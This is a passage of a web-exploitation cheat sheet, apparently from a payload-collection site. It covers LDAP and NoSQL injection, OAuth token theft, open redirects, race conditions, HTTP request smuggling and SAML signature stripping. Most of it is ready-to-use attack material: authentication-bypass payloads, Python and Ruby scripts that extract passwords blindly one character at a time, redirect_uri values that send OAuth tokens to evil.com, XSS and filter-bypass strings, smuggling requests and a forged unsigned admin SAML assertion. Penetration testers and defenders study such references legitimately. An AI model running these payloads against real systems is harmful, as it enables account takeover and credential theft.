Example 2\nuser = admin)(!(\u0026amp;(1=0 pass = q)) query = (\u0026amp;(uid=admin)(!(\u0026amp;(1=0)(userPassword=q)))) Payloads # * *)(\u0026amp; *))%00 )(cn=))\\x00 *()|%26\u0026#39; *()|\u0026amp;\u0026#39; *(|(mail=*)) *(|(objectclass=*)) *)(uid=*))(|(uid=* */* *| / // //* @* | admin* admin*)((|userpassword=*) admin*)((|userPassword=*) x\u0026#39; or name()=\u0026#39;username\u0026#39; or \u0026#39;x\u0026#39;=\u0026#39;y Blind Exploitation # We can extract using a bypass login\n(\u0026amp;(sn=administrator)(password=*)) : OK (\u0026amp;(sn=administrator)(password=A*)) : KO (\u0026amp;(sn=administrator)(password=B*)) : KO ... (\u0026amp;(sn=administrator)(password=M*)) : OK (\u0026amp;(sn=administrator)(password=MA*)) : KO (\u0026amp;(sn=administrator)(password=MB*)) : KO ... (\u0026amp;(sn=administrator)(password=MY*)) : OK (\u0026amp;(sn=administrator)(password=MYA*)) : KO (\u0026amp;(sn=administrator)(password=MYB*)) : KO (\u0026amp;(sn=administrator)(password=MYC*)) : KO ... (\u0026amp;(sn=administrator)(password=MYK*)) : OK (\u0026amp;(sn=administrator)(password=MYKE)) : OK Defaults attributes # Can be used in an injection like *)(ATTRIBUTE_HERE=*\nuserPassword surname name cn sn objectClass mail givenName commonName Exploiting userPassword attribute # userPassword attribute is not a string like the cn attribute for example but it’s an OCTET STRING In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).\noctetStringOrderingMatch (OID 2.5.13.18): An ordering matching rule that will perform a bit-by-bit comparison (in big endian ordering) of two octet string values until a difference is found. The first case in which a zero bit is found in one value but a one bit is found in another will cause the value with the zero bit to be considered less than the value with the one bit.\nuserPassword:2.5.13.18:=\\xx (\\xx is a byte) userPassword:2.5.13.18:=\\xx\\xx userPassword:2.5.13.18:=\\xx\\xx\\xx Scripts # Discover valid LDAP fields # #!/usr/bin/python3 import requests import string fields = [] url = \u0026#39;https://URL.com/\u0026#39; f = open(\u0026#39;dic\u0026#39;, \u0026#39;r\u0026#39;) #Open the wordlists of common attributes wordl = f.read().split(\u0026#39;\\n\u0026#39;) f.close() for i in wordl: r = requests.post(url, data = {\u0026#39;login\u0026#39;:\u0026#39;*)(\u0026#39;+str(i)+\u0026#39;=*))\\x00\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;bla\u0026#39;}) #Like (\u0026amp;(login=*)(ITER_VAL=*))\\x00)(password=bla)) if \u0026#39;TRUE CONDITION\u0026#39; in r.text: fields.append(str(i)) print(fields) Ref. [5][5]\nSpecial blind LDAP injection (without \u0026ldquo;*\u0026rdquo;) # #!/usr/bin/python3 import requests, string alphabet = string.ascii_letters + string.digits + \u0026#34;_@{}-/()!\\\u0026#34;$%=^[]:;\u0026#34; flag = \u0026#34;\u0026#34; for i in range(50): print(\u0026#34;[i] Looking for number \u0026#34; + str(i)) for char in alphabet: r = requests.get(\u0026#34;http://ctf.web?action=dir\u0026amp;search=admin*)(password=\u0026#34; + flag + char) if (\u0026#34;TRUE CONDITION\u0026#34; in r.text): flag += char print(\u0026#34;[+] Flag: \u0026#34; + flag) break Ref. [5][5]\n#!/usr/bin/env ruby require \u0026#39;net/http\u0026#39; alphabet = [*\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;, *\u0026#39;A\u0026#39;..\u0026#39;Z\u0026#39;, *\u0026#39;0\u0026#39;..\u0026#39;9\u0026#39;] + \u0026#39;_@{}-/()!\u0026#34;$%=^[]:;\u0026#39;.split(\u0026#39;\u0026#39;) flag = \u0026#39;\u0026#39; (0..50).each do |i| puts(\u0026#34;[i] Looking for number #{i}\u0026#34;) alphabet.each do |char| r = Net::HTTP.get(URI(\u0026#34;http://ctf.web?action=dir\u0026amp;search=admin*)(password=#{flag}#{char}\u0026#34;)) if /TRUE CONDITION/.match?(r) flag += char puts(\u0026#34;[+] Flag: #{flag}\u0026#34;) break end end end By noraj\nReferences # OWASP LDAP Injection LDAP Blind Explorer ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN Quals ECW 2018 - Maki How To Manage and Use LDAP Servers with OpenLDAP Utilities How To Configure OpenLDAP and Perform Administrative LDAP Tasks SSH key authentication via LDAP How to setup LDAP server for openssh-lpk openssh-lpk.ldif Setting up OpenLDAP server with OpenSSH-LPK on Ubuntu 14.04 SSH key authentication using LDAP [FR] SSH et LDAP SSH Public Keys in OpenLDAP "},{"id":58,"href":"/docs/nosql_injection/","title":"NoSQL Injection","section":"Docs","content":" NoSQL injection # NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren\u0026rsquo;t using the traditional SQL syntax.\nTools # NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool nosqlilab - A lab for playing with NoSQL Injection Burp-NoSQLiScanner - Plugin available in burpsuite Exploit # Authentication Bypass # Basic authentication bypass using not equal ($ne) or greater ($gt)\nin DATA username[$ne]=toto\u0026amp;password[$ne]=toto login[$regex]=a.*\u0026amp;pass[$ne]=lol login[$gt]=admin\u0026amp;login[$lt]=test\u0026amp;pass[$ne]=1 login[$nin][]=admin\u0026amp;login[$nin][]=test\u0026amp;pass[$ne]=toto in JSON {\u0026#34;username\u0026#34;: {\u0026#34;$ne\u0026#34;: null}, \u0026#34;password\u0026#34;: {\u0026#34;$ne\u0026#34;: null}} {\u0026#34;username\u0026#34;: {\u0026#34;$ne\u0026#34;: \u0026#34;foo\u0026#34;}, \u0026#34;password\u0026#34;: {\u0026#34;$ne\u0026#34;: \u0026#34;bar\u0026#34;}} {\u0026#34;username\u0026#34;: {\u0026#34;$gt\u0026#34;: undefined}, \u0026#34;password\u0026#34;: {\u0026#34;$gt\u0026#34;: undefined}} {\u0026#34;username\u0026#34;: {\u0026#34;$gt\u0026#34;:\u0026#34;\u0026#34;}, \u0026#34;password\u0026#34;: {\u0026#34;$gt\u0026#34;:\u0026#34;\u0026#34;}} Extract length information # username[$ne]=toto\u0026amp;password[$regex]=.{1} username[$ne]=toto\u0026amp;password[$regex]=.{3} Extract data information # in URL username[$ne]=toto\u0026amp;password[$regex]=m.{2} username[$ne]=toto\u0026amp;password[$regex]=md.{1} username[$ne]=toto\u0026amp;password[$regex]=mdp username[$ne]=toto\u0026amp;password[$regex]=m.* username[$ne]=toto\u0026amp;password[$regex]=md.* in JSON {\u0026#34;username\u0026#34;: {\u0026#34;$eq\u0026#34;: \u0026#34;admin\u0026#34;}, \u0026#34;password\u0026#34;: {\u0026#34;$regex\u0026#34;: \u0026#34;^m\u0026#34; }} {\u0026#34;username\u0026#34;: {\u0026#34;$eq\u0026#34;: \u0026#34;admin\u0026#34;}, \u0026#34;password\u0026#34;: {\u0026#34;$regex\u0026#34;: \u0026#34;^md\u0026#34; }} {\u0026#34;username\u0026#34;: {\u0026#34;$eq\u0026#34;: \u0026#34;admin\u0026#34;}, \u0026#34;password\u0026#34;: {\u0026#34;$regex\u0026#34;: \u0026#34;^mdp\u0026#34; }} Extract data with \u0026ldquo;in\u0026rdquo;\n{\u0026#34;username\u0026#34;:{\u0026#34;$in\u0026#34;:[\u0026#34;Admin\u0026#34;, \u0026#34;4dm1n\u0026#34;, \u0026#34;admin\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;administrator\u0026#34;]},\u0026#34;password\u0026#34;:{\u0026#34;$gt\u0026#34;:\u0026#34;\u0026#34;}} SSJI # \u0026#39;;return \u0026#39;a\u0026#39;==\u0026#39;a\u0026#39; \u0026amp;\u0026amp; \u0026#39;\u0026#39;==\u0026#39; \u0026#34;;return \u0026#39;a\u0026#39;==\u0026#39;a\u0026#39; \u0026amp;\u0026amp; \u0026#39;\u0026#39;==\u0026#39; 0;return true Blind NoSQL # POST with JSON body # python script:\nimport requests import urllib3 import string import urllib urllib3.disable_warnings() username=\u0026#34;admin\u0026#34; password=\u0026#34;\u0026#34; u=\u0026#34;http://example.org/login\u0026#34; headers={\u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39;} while True: for c in string.printable: if c not in [\u0026#39;*\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;.\u0026#39;,\u0026#39;?\u0026#39;,\u0026#39;|\u0026#39;]: payload=\u0026#39;{\u0026#34;username\u0026#34;: {\u0026#34;$eq\u0026#34;: \u0026#34;%s\u0026#34;}, \u0026#34;password\u0026#34;: {\u0026#34;$regex\u0026#34;: \u0026#34;^%s\u0026#34; }}\u0026#39; % (username, password + c) r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False) if \u0026#39;OK\u0026#39; in r.text or r.status_code == 302: print(\u0026#34;Found one more char : %s\u0026#34; % (password+c)) password += c POST with urlencoded body # python script:\nimport requests import urllib3 import string import urllib urllib3.disable_warnings() username=\u0026#34;admin\u0026#34; password=\u0026#34;\u0026#34; u=\u0026#34;http://example.org/login\u0026#34; headers={\u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;} while True: for c in string.printable: if c not in [\u0026#39;*\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;.\u0026#39;,\u0026#39;?\u0026#39;,\u0026#39;|\u0026#39;,\u0026#39;\u0026amp;\u0026#39;,\u0026#39;$\u0026#39;]: payload=\u0026#39;user=%s\u0026amp;pass[$regex]=^%s\u0026amp;remember=on\u0026#39; % (username, password + c) r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False) if r.status_code == 302 and r.headers[\u0026#39;Location\u0026#39;] == \u0026#39;/dashboard\u0026#39;: print(\u0026#34;Found one more char : %s\u0026#34; % (password+c)) password += c GET # python script:\nimport requests import urllib3 import string import urllib urllib3.disable_warnings() username=\u0026#39;admin\u0026#39; password=\u0026#39;\u0026#39; u=\u0026#39;http://example.org/login\u0026#39; while True: for c in string.printable: if c not in [\u0026#39;*\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;.\u0026#39;,\u0026#39;?\u0026#39;,\u0026#39;|\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;$\u0026#39;]: payload=f\u0026#34;?username={username}\u0026amp;password[$regex]=^{password + c}\u0026#34; r = requests.get(u + payload) if \u0026#39;Yeah\u0026#39; in r.text: print(f\u0026#34;Found one more char : {password+c}\u0026#34;) password += c ruby script:\nrequire \u0026#39;httpx\u0026#39; username = \u0026#39;admin\u0026#39; password = \u0026#39;\u0026#39; url = \u0026#39;http://example.org/login\u0026#39; # CHARSET = (?!..?~).to_a # all ASCII printable characters CHARSET = [*\u0026#39;0\u0026#39;..\u0026#39;9\u0026#39;,*\u0026#39;a\u0026#39;..\u0026#39;z\u0026#39;,\u0026#39;-\u0026#39;] # alphanumeric + \u0026#39;-\u0026#39; GET_EXCLUDE = [\u0026#39;*\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;.\u0026#39;,\u0026#39;?\u0026#39;,\u0026#39;|\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;$\u0026#39;] session = HTTPX.plugin(:persistent) while true CHARSET.each do |c| unless GET_EXCLUDE.include?(c) payload = \u0026#34;?username=#{username}\u0026amp;password[$regex]=^#{password + c}\u0026#34; res = session.get(url + payload) if res.body.to_s.match?(\u0026#39;Yeah\u0026#39;) puts \u0026#34;Found one more char : #{password + c}\u0026#34; password += c end end end end MongoDB Payloads # true, $where: \u0026#39;1 == 1\u0026#39; , $where: \u0026#39;1 == 1\u0026#39; $where: \u0026#39;1 == 1\u0026#39; \u0026#39;, $where: \u0026#39;1 == 1\u0026#39; 1, $where: \u0026#39;1 == 1\u0026#39; { $ne: 1 } \u0026#39;, $or: [ {}, { \u0026#39;a\u0026#39;:\u0026#39;a \u0026#39; } ], $comment:\u0026#39;successful MongoDB injection\u0026#39; db.injection.insert({success:1}); db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1 || 1==1 \u0026#39; \u0026amp;\u0026amp; this.password.match(/.*/)//+%00 \u0026#39; \u0026amp;\u0026amp; this.passwordzz.match(/.*/)//+%00 \u0026#39;%20%26%26%20this.password.match(/.*/)//+%00 \u0026#39;%20%26%26%20this.passwordzz.match(/.*/)//+%00 {$gt: \u0026#39;\u0026#39;} [$ne]=1 \u0026#39;;return \u0026#39;a\u0026#39;==\u0026#39;a\u0026#39; \u0026amp;\u0026amp; \u0026#39;\u0026#39;==\u0026#39; \u0026#34;;return(true);var xyz=\u0026#39;a 0;return true References # Les NOSQL injections Classique et Blind: Never trust user input - Geluchat Testing for NoSQL injection - OWASP/WSTG NoSQL injection wordlists - cr0hn NoSQL Injection in MongoDB - JUL 17, 2016 - Zanon Burp-NoSQLiScanner "},{"id":59,"href":"/docs/oauth/","title":"OAuth","section":"Docs","content":" OAuth # Stealing OAuth Token via referer # From @abugzlife1 tweet.\nDo you have HTML injection but can\u0026rsquo;t get XSS? Are there any OAuth implementations on the site? If so, setup an img tag to your server and see if there\u0026rsquo;s a way to get the victim there (redirect, etc.) after login to steal OAuth tokens via referer\nGrabbing OAuth Token via redirect_uri # Redirect to a controlled domain to get the access token\nhttps://www.example.com/signin/authorize?[...]\u0026amp;redirect_uri=https://demo.example.com/loginsuccessful https://www.example.com/signin/authorize?[...]\u0026amp;redirect_uri=https://localhost.evil.com Redirect to an accepted Open URL in to get the access token\nhttps://www.example.com/oauth20_authorize.srf?[...]\u0026amp;redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com https://www.example.com/oauth2/authorize?[...]\u0026amp;redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F OAuth implementations should never whitelist entire domains, only a few URLs so that “redirect_uri” can’t be pointed to an Open Redirect.\nSometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri:\nhttps://www.example.com/admin/oauth/authorize?[...]\u0026amp;scope=a\u0026amp;redirect_uri=https://evil.com Executing XSS via redirect_uri # https://example.com/oauth/v1/authorize?[...]\u0026amp;redirect_uri=data%3Atext%2Fhtml%2Ca\u0026amp;state=\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; OAuth private key disclosure # Some Android/iOS app can be decompiled and the OAuth Private key can be accessed.\nAuthorization Code Rule Violation # The client MUST NOT use the authorization code more than once.\nIf an authorization code is used more than once, the authorization server MUST deny the request and SHOULD revoke (when possible) all tokens previously issued based on that authorization code.\nCross-Site Request Forgery # Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and intercepting the callback (https://example.com/callback?code=AUTHORIZATION_CODE). This URL can be used in CSRF attacks.\nThe client MUST implement CSRF protection for its redirection URI. This is typically accomplished by requiring any request sent to the redirection URI endpoint to include a value that binds the request to the user-agent\u0026rsquo;s authenticated state. The client SHOULD utilize the \u0026ldquo;state\u0026rdquo; request parameter to deliver this value to the authorization server when making an authorization request.\nReferences # All your Paypal OAuth tokens belong to me - localhost for the win - INTO THE SYMMETRY OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - INTO THE SYMMETRY How I hacked Github again. - Egor Homakov How Microsoft is giving your data to Facebook… and everyone else - Andris Atteka Bypassing Google Authentication on Periscope\u0026rsquo;s Administration Panel By Jack Whitton "},{"id":60,"href":"/docs/open_url_redirection/","title":"Open URL Redirection","section":"Docs","content":" Open URL Redirection # Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Un-validated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application’s access control check and then forward the attacker to privileged functions that they would normally not be able to access.\nExploitation # Let’s say there’s a well known website - https://famous-website.tld/. And let\u0026rsquo;s assume that there\u0026rsquo;s a link like :\nhttps://famous-website.tld/signup?redirectUrl=https://famous-website.tld/account After signing up you get redirected to your account, this redirection is specified by the redirectUrl parameter in the URL.\nWhat happens if we change the famous-website.tld/account to evil-website.tld?\nhttps://famous-website.tld/signup?redirectUrl=https://evil-website.tld/account By visiting this url, if we get redirected to evil-website.tld after the sign-up, we have an Open Redirect vulnerability. This can be abused by an attacker to display a phishing page asking you to enter your credentials.\nHTTP Redirection Status Code - 3xx # 300 Multiple Choices 301 Moved Permanently 302 Found 303 See Other 304 Not Modified 305 Use Proxy 307 Temporary Redirect 308 Permanent Redirect Fuzzing # Replace www.whitelisteddomain.tld from Open-Redirect-payloads.txt with a specific white listed domain in your test case\nTo do this simply modify the WHITELISTEDDOMAIN with value www.test.com to your test case URL.\nWHITELISTEDDOMAIN=\u0026#34;www.test.com\u0026#34; \u0026amp;\u0026amp; sed \u0026#39;s/www.whitelisteddomain.tld/\u0026#39;\u0026#34;$WHITELISTEDDOMAIN\u0026#34;\u0026#39;/\u0026#39; Open-Redirect-payloads.txt \u0026gt; Open-Redirect-payloads-burp-\u0026#34;$WHITELISTEDDOMAIN\u0026#34;.txt \u0026amp;\u0026amp; echo \u0026#34;$WHITELISTEDDOMAIN\u0026#34; | awk -F. \u0026#39;{print \u0026#34;https://\u0026#34;$0\u0026#34;.\u0026#34;$NF}\u0026#39; \u0026gt;\u0026gt; Open-Redirect-payloads-burp-\u0026#34;$WHITELISTEDDOMAIN\u0026#34;.txt Filter Bypass # Using a whitelisted domain or keyword\nwww.whitelisted.com.evil.com redirect to evil.com Using CRLF to bypass \u0026ldquo;javascript\u0026rdquo; blacklisted keyword\njava%0d%0ascript%0d%0a:alert(0) Using \u0026ldquo;//\u0026rdquo; \u0026amp; \u0026ldquo;////\u0026rdquo; to bypass \u0026ldquo;http\u0026rdquo; blacklisted keyword\n//google.com ////google.com Using \u0026ldquo;https:\u0026rdquo; to bypass \u0026ldquo;//\u0026rdquo; blacklisted keyword\nhttps:google.com Using \u0026ldquo;//\u0026rdquo; to bypass \u0026ldquo;//\u0026rdquo; blacklisted keyword (Browsers see // as //)\n\\/\\/google.com/ /\\/google.com/ Using \u0026ldquo;%E3%80%82\u0026rdquo; to bypass \u0026ldquo;.\u0026rdquo; blacklisted character\n/?redir=google。com //google%E3%80%82com Using null byte \u0026ldquo;%00\u0026rdquo; to bypass blacklist filter\n//google%00.com Using parameter pollution\n?next=whitelisted.com\u0026amp;next=google.com Using \u0026ldquo;@\u0026rdquo; character, browser will redirect to anything after the \u0026ldquo;@\u0026rdquo;\nhttp://www.theirsite.com@yoursite.com/ Creating folder as their domain\nhttp://www.yoursite.com/http://www.theirsite.com/ http://www.yoursite.com/folder/www.folder.com Using \u0026ldquo;?\u0026rdquo; characted, browser will translate it to \u0026ldquo;/?\u0026rdquo;\nhttp://www.yoursite.com?http://www.theirsite.com/ http://www.yoursite.com?folder/www.folder.com Host/Split Unicode Normalization\nhttps://evil.c℀.example.com . +++\u0026gt; https://evil.ca/c.example.com http://a.com／X.b.com XSS from Open URL - If it\u0026rsquo;s in a JS variable\n\u0026#34;;alert(0);// XSS from data:// wrapper\nhttp://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg== XSS from javascript:// wrapper\nhttp://www.example.com/redirect.php?url=javascript:prompt(1) Common injection parameters # /{payload} ?next={payload} ?url={payload} ?target={payload} ?rurl={payload} ?dest={payload} ?destination={payload} ?redir={payload} ?redirect_uri={payload} ?redirect_url={payload} ?redirect={payload} /redirect/{payload} /cgi-bin/redirect.cgi?{payload} /out/{payload} /out?{payload} ?view={payload} /login?to={payload} ?image_url={payload} ?go={payload} ?return={payload} ?returnTo={payload} ?return_to={payload} ?checkout_url={payload} ?continue={payload} ?return_path={payload} References # filedescriptor You do not need to run 80 reconnaissance tools to get access to user accounts - @stefanocoding OWASP - Unvalidated Redirects and Forwards Cheat Sheet Cujanovic - Open-Redirect-Payloads Pentester Land - Open Redirect Cheat Sheet Open Redirect Vulnerability - AUGUST 15, 2018 - s0cket7 Host/Split Exploitable Antipatterns in Unicode Normalization - BlackHat US 2019 "},{"id":61,"href":"/docs/race_conditions/","title":"Race Conditions","section":"Docs","content":" Race Condition # Race conditions may occur when a process is critically or unexpectedly dependent on the sequence or timings of other events. In a web application environment, where multiple requests can be processed at a given time, developers may leave concurrency to be handled by the framework, server, or programming language.\nTools # Turbo Intruder - a Burp Suite extension for sending large numbers of HTTP requests and analyzing the results. Turbo Intruder Examples # Send request to turbo intruder Use this python code as a payload of the turbo intruder def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=30, pipeline=False ) for i in range(30): engine.queue(target.req, i) engine.queue(target.req, target.baseInput, gate=\u0026#39;race1\u0026#39;) engine.start(timeout=5) engine.openGate(\u0026#39;race1\u0026#39;) engine.complete(timeout=60) def handleResponse(req, interesting): table.add(req) Now set the external HTTP header x-request: %s - :warning: This is needed by the turbo intruder Click \u0026ldquo;Attack\u0026rdquo; Turbo Intruder 2 Requests Examples # This following template can use when use have to send race condition of request2 immediately after send a request1 when the window may only be a few milliseconds.\ndef queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100, pipeline=False ) request1 = \u0026#39;\u0026#39;\u0026#39; POST /target-URI-1 HTTP/1.1 Host: \u0026lt;REDACTED\u0026gt; Cookie: session=\u0026lt;REDACTED\u0026gt; parameterName=parameterValue \u0026#39;\u0026#39;\u0026#39; request2 = \u0026#39;\u0026#39;\u0026#39; GET /target-URI-2 HTTP/1.1 Host: \u0026lt;REDACTED\u0026gt; Cookie: session=\u0026lt;REDACTED\u0026gt; \u0026#39;\u0026#39;\u0026#39; engine.queue(request1, gate=\u0026#39;race1\u0026#39;) for i in range(30): engine.queue(request2, gate=\u0026#39;race1\u0026#39;) engine.openGate(\u0026#39;race1\u0026#39;) engine.complete(timeout=60) def handleResponse(req, interesting): table.add(req) References # Race Condition allows to redeem multiple times gift cards which leads to free \u0026ldquo;money\u0026rdquo; - @muon4 Turbo Intruder: Embracing the billion-request attack - James Kettle | 25 January 2019 Race Condition Bug In Web App: A Use Case - Mandeep Jadon "},{"id":62,"href":"/docs/request_smuggling/","title":"Request Smuggling","section":"Docs","content":" Request Smuggling # Tools # HTTP Request Smuggler / BApp Store Smuggler Simple HTTP Smuggler Generator CL.TE TE.CL \u0026gt; this tool does not offer automated exploitation. You have to identify the injection point and exploit it manually! About CL.TE | TE.CL Vulnerabilities # If you want to exploit HTTP Requests Smuggling manually you will face some problems especially in TE.CL vulnerability you have to calculate the chunk size for the second request(malicious request) as portswigger suggests Manually fixing the length fields in request smuggling attacks can be tricky.. For that reason you can use the Simple HTTP Smuggler Generator CL.TE TE.CL and exploit the CL.TE TE.CL vulnerabilities manually and learn how this vulnerability works and how you can exploit it. This tool offers you only the second request with a valid chunk size(TE.CL) auto-generated but does not offer automated exploitation. You have to identify the injection point and exploit it manually!\nCL.TE vulnerabilities # The front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.\nPOST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 13 Transfer-Encoding: chunked 0 SMUGGLED Example:\nPOST / HTTP/1.1 Host: domain.example.com Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G Challenge: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te\nTE.CL vulnerabilities # The front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.\nPOST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 3 Transfer-Encoding: chunked 8 SMUGGLED 0 Example:\nPOST / HTTP/1.1 Host: domain.example.com User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Content-Length: 4 Connection: close Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 :warning: To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the \u0026ldquo;Update Content-Length\u0026rdquo; option is unchecked.You need to include the trailing sequence \\r\\n\\r\\n following the final 0.\nChallenge: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl\nTE.TE behavior: obfuscating the TE header # The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.\nTransfer-Encoding: xchunked Transfer-Encoding : chunked Transfer-Encoding: chunked Transfer-Encoding: x Transfer-Encoding:[tab]chunked [space]Transfer-Encoding: chunked X: X[\\n]Transfer-Encoding: chunked Transfer-Encoding : chunked Challenge: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header\nReferences # PortSwigger - Request Smuggling Tutorial and PortSwigger - Request Smuggling Reborn A Pentester\u0026rsquo;s Guide to HTTP Request Smuggling - Busra Demir - 2020, October 16 "},{"id":63,"href":"/docs/saml_injection/","title":"SAML Injection","section":"Docs","content":" SAML Injection # Security Assertion Markup Language (SAML) is an open standard that allows security credentials to be shared by multiple computers across a network. When using SAML-based Single Sign-On (SSO), three distinct parties are involved. There is a user (the so-called principal), an IDentity Provider (IDP), and a cloud application Service Provider (SP). - centrify\nTools # SAML Raider - Burp Extension SAML Support - ZAP Addon Authentication Bypass # A SAML Response should contain the \u0026lt;samlp:Response xmlns:samlp=\u0026quot;urn:oasis:names:tc:SAML:2.0:protocol\u0026quot;.\nInvalid Signature # Signatures which are not signed by a real CA are prone to cloning. Ensure the signature is signed by a real CA. If the certificate is self-signed, you may be able to clone the certificate or create your own self-signed certificate to replace it.\nSignature Stripping # [\u0026hellip;]accepting unsigned SAML assertions is accepting a username without checking the password - @ilektrojohn\nThe goal is to forge a well formed SAML Assertion without signing it. For some default configurations if the signature section is omitted from a SAML response, then no signature verification is performed.\nExample of SAML assertion where NameID=admin without signature.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;saml2p:Response xmlns:saml2p=\u0026#34;urn:oasis:names:tc:SAML:2.0:protocol\u0026#34; Destination=\u0026#34;http://localhost:7001/saml2/sp/acs/post\u0026#34; ID=\u0026#34;id39453084082248801717742013\u0026#34; IssueInstant=\u0026#34;2018-04-22T10:28:53.593Z\u0026#34; Version=\u0026#34;2.0\u0026#34;\u0026gt; \u0026lt;saml2:Issuer xmlns:saml2=\u0026#34;urn:oasis:names:tc:SAML:2.0:assertion\u0026#34; Format=\u0026#34;urn:oasis:names:tc:SAML:2.0:nameidformat:entity\u0026#34;\u0026gt;REDACTED\u0026lt;/saml2:Issuer\u0026gt; \u0026lt;saml2p:Status xmlns:saml2p=\u0026#34;urn:oasis:names:tc:SAML:2.0:protocol\u0026#34;\u0026gt; \u0026lt;saml2p:StatusCode Value=\u0026#34;urn:oasis:names:tc:SAML:2.0:status:Success\u0026#34; /\u0026gt; \u0026lt;/saml2p:Status\u0026gt; \u0026lt;saml2:Assertion xmlns:saml2=\u0026#34;urn:oasis:names:tc:SAML:2.0:assertion\u0026#34; ID=\u0026#34;id3945308408248426654986295\u0026#34; IssueInstant=\u0026#34;2018-04-22T10:28:53.593Z\u0026#34; Version=\u0026#34;2.0\u0026#34;\u0026gt; \u0026lt;saml2:Issuer Format=\u0026#34;urn:oasis:names:tc:SAML:2.0:nameid-format:entity\u0026#34; xmlns:saml2=\u0026#34;urn:oasis:names:tc:SAML:2.0:assertion\u0026#34;\u0026gt;REDACTED\u0026lt;/saml2:Issuer\u0026gt; \u0026lt;saml2:Subject xmlns:saml2=\u0026#34;urn:oasis:names:tc:SAML:2.0:assertion\u0026#34;\u0026gt; \u0026lt;saml2:NameID Format=\u0026#34;urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified\u0026#34;\u0026gt;admin\u0026lt;/saml2:NameID\u0026gt; \u0026lt;saml2:SubjectConfirmation Method=\u0026#34;urn:oasis:names:tc:SAML:2.0:cm:bearer\u0026#34;\u0026gt; \u0026lt;saml2:SubjectConfirmationData NotOnOrAfter=\u0026#34;2018-04-22T10:33:53.593Z\u0026#34; Recipient=\u0026#34;http://localhost:7001/saml2/sp/acs/post\u0026#34; /\u0026gt; \u0026lt;/saml2:SubjectConfirmation\u0026gt; \u0026lt;/saml2:Subject\u0026gt; \u0026lt;saml2:Conditions NotBefore=\u0026#34;2018-04-22T10:23:53.593Z\u0026#34; NotOnOrAfter=\u0026#34;2018-0422T10:33:53.593Z\u0026#34; xmlns:saml2=\u0026#34;urn:oasis:names:tc:SAML:2.0:assertion\u0026#34;\u0026gt; \u0026lt;saml2:AudienceRestriction\u0026gt; \u0026lt;saml2:Audience\u0026gt;WLS_SP\u0026lt;/saml2:Audience\u0026gt; \u0026lt;/saml2:AudienceRestriction\u0026gt; \u0026lt;/saml2:Conditions\u0026gt; \u0026lt;saml2:AuthnStatement AuthnInstant=\u0026#34;2018-04-22T10:28:49.876Z\u0026#34; SessionIndex=\u0026#34;id1524392933593.694282512\u0026#34; xmlns:saml2=\u0026#34;urn:oasis:names:tc:SAML:2.0:assertion\u0026#34;\u0026gt; \u0026lt;saml2:AuthnContext\u0026gt; \u0026lt;saml2:AuthnContextClassRef\u0026gt;urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport\u0026lt;/saml2:AuthnContextClassRef\u0026gt; \u0026lt;/saml2:AuthnContext\u0026gt; \u0026lt;/saml2:AuthnStatement\u0026gt; \u0026lt;/saml2:Assertion\u0026gt; \u0026lt;/saml2p:Response\u0026gt; XML Signature Wrapping Attacks # XML Signature Wrapping (XSW) attack, some implementations check for a valid signature and match it to a valid assertion, but do not check for multiple assertions, 